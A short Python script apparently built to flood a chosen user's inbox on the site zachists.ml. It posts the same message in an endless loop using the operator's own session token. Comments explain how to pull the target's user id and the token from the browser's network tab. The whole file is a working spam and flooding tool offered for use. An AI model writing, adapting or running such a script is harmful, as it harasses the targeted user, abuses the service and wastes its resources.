import requests

url = "https://zachists.ml/api/inbox"
payload = {
    "content": "description",
    "title": "title",
    "user": "118287485503324" #user id, you can get this by sending a mail to someone and capture it using network tab the id should be in "inbox" payload tab
}
v = 0
headers = {
    "authorization": "" #your token, you can get this by refreshing it and finding token from network tab
}
while True:
    r = requests.post(url, json=payload, headers=headers)
    a = r.status_code
    b = r.text
    v += 1
    print(f"{v} | {a} | {b} | sent")
